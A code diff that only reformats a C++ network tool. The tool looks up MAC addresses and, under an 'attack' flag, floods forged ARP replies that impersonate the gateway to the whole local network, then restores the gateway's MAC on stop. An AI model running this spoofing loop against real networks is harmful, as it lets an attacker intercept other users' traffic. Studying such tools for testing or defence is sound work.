@@ -8,10 +8,7 @@ DEFINE_bool(attack, false, "attack whole network by pretending myself to be gate
 
 std::atomic<bool> end_attack = false;
 
-void on_interrupt(int)
-{
-    end_attack = true;
-}
+void on_interrupt(int) { end_attack = true; }
 
 int main(int argc, char* argv[])
 {
@@ -31,7 +28,7 @@ int main(int argc, char* argv[])
         input_ip = ip4_addr(argv[1]);
     }
     adapter_info apt_info;
-    pcap_t *adhandle = open_target_adaptor(input_ip, false, apt_info);
+    pcap_t* adhandle = open_target_adaptor(input_ip, false, apt_info);
 
     if (FLAGS_attack) {
         if (apt_info.gateway == PLACEHOLDER_IPv4_ADDR) {
@@ -45,22 +42,22 @@ int main(int argc, char* argv[])
         }
         LOG(INFO) << "forging gateway's mac to " << apt_info.mac << "...";
         while (!end_attack) {
-            send_arp(adhandle, ARP_REPLY_OP, apt_info.mac, apt_info.gateway, apt_info.mac, apt_info.ip);
+            send_arp(adhandle, ARP_REPLY_OP, apt_info.mac, apt_info.gateway, apt_info.mac,
+                     apt_info.ip);
             std::this_thread::sleep_for(std::chrono::milliseconds(1000));
         }
         LOG(INFO) << "attack stopped";
         if (ip2mac(adhandle, apt_info, apt_info.gateway, gateway_mac, 5000) == NTLS_SUCC) {
-            if (send_arp(adhandle, ARP_REPLY_OP, gateway_mac, apt_info.gateway, apt_info.mac, apt_info.ip) == NTLS_SUCC) {
+            if (send_arp(adhandle, ARP_REPLY_OP, gateway_mac, apt_info.gateway, apt_info.mac,
+                         apt_info.ip) == NTLS_SUCC) {
                 LOG(INFO) << "gateway's mac restored to " << gateway_mac;
             }
         }
-    }
-    else {
+    } else {
         eth_addr target_mac;
         if (ip2mac(adhandle, apt_info, input_ip, target_mac, 5000) == NTLS_SUCC) {
             std::cout << input_ip << " is at " << target_mac << "." << std::endl;
-        }
-        else {
+        } else {
             std::cout << input_ip << " is offline." << std::endl;
         }
     }
